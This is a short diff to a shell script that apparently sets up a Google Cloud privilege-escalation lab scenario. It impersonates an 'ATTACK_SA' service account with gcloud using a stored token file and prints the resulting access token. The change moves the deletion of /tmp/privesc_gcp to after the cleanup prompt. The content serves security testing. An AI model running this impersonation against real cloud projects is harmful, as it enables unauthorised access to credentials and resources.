@@ -15,12 +15,11 @@ gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gs
 gcloud --access-token-file /tmp/privesc_gcp --impersonate-service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \
   auth print-access-token
 
-rm /tmp/privesc_gcp
 # Cleaning
 echo "You should see a token before this message"
 read -p "Press any key to delete scenario... " -n1 -s
 echo ""
 
-# No deletion needed
+rm /tmp/privesc_gcp
 
 echo "================================================"
